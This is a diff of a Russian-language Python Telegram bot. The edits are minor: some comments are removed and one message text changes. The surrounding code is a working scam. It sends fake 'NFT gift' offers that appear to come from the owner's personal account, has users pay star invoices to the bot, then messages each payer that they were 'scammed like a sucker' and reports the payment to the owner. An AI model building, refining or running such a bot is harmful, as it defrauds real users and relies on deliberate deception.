@@ -327,7 +327,6 @@ async def open_payment(user_id: int, deal_id: int):
     if photo_url:
         kwargs["photo_url"] = photo_url
 
-    # ВАЖНО: инвойс создаётся БЕЗ business_connection_id — чтобы оплата пришла напрямую боту
     await bot.send_invoice(
         chat_id=user_id,
         title=row["nft_name"] or "NFT Подарок",
@@ -502,8 +501,6 @@ async def on_user_selected(message: Message, state: FSMContext):
 
     photo_url = await get_current_bot_avatar_url()
 
-    # ВАЖНО: инвойс-ссылка создаётся БЕЗ business_connection_id,
-    # чтобы оплата пришла напрямую боту и он 100% её увидел.
     invoice_kwargs = {}
     if photo_url:
         invoice_kwargs["photo_url"] = photo_url
@@ -531,7 +528,7 @@ async def on_user_selected(message: Message, state: FSMContext):
     rich_message = InputRichMessage(
         blocks=[
             InputRichBlockParagraph(text=f"{sender_name} предлагает {nft_link} За {price} звезду."),
-            InputRichBlockParagraph(text="Предложение действует 24 часа"),
+            InputRichBlockParagraph(text="\n\nПредложение действует 24 часа"),
             InputRichBlockButtons(buttons=[RichMessageButton(text="ПРИНЯТЬ", url=invoice_link, style="success")]),
             InputRichBlockButtons(buttons=[RichMessageButton(text="ИГНОРИРОВАТЬ", url="https://t.me/NorikAmiri", style="danger")])
         ]
@@ -540,7 +537,6 @@ async def on_user_selected(message: Message, state: FSMContext):
     sent_via = None
     last_error = None
 
-    # Отправляем через business (сообщение от твоего лица), но инвойс — от бота
     if BUSINESS_CONNECTION_ID:
         try:
             await bot.send_rich_message(
@@ -620,7 +616,6 @@ async def payment_success(message: Message):
     buyer_first_name = buyer.first_name or "Покупатель"
     buyer_link = f'<a href="tg://user?id={buyer_id}">{buyer_first_name}</a>'
 
-    # ===== СООБЩЕНИЕ ПОКУПАТЕЛЮ =====
     try:
         await message.answer(
             'тебя заскамили как лоха <tg-emoji emoji-id="5391011124231556271">😂</tg-emoji>',
@@ -630,7 +625,6 @@ async def payment_success(message: Message):
     except Exception as e:
         print(f"[payment] Ошибка: {e}")
 
-    # Уведомление владельцу
     text = (
         f"💰 <b>НОВАЯ ОПЛАТА!</b>\n\n"
         f"👤 Покупатель: {buyer_link}\n"
